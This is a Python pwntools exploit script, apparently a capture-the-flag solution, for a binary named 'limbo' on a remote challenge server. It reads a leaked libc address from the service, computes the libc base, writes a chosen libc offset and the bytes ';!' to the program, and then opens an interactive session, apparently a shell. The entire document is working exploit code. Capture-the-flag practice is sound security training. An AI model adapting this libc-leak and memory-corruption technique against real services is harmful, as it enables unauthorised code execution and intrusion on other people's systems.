#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./limbo')

host = args.HOST or 'io.ept.gg'
port = int(args.PORT or 30003)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())


# 483160 b'\xfe\xac'
# 285415 b'\x06b'
# 962153 b'\x84\x0e'
# 584452 b';!'


io = start()
io.recvuntil(b'libc')
io.recvuntil(b'[')
leak = int(io.recvuntil('-')[:-1], 16)
libcaddress = leak - 0x28000
log.success(f'libc base @ {hex(libcaddress)}')

io.recvuntil(b'>')
io.sendline(hex(libcaddress+584452))

io.sendline(b';!')
# print(addrs[i],bts[i])
io.interactive()
io.close()
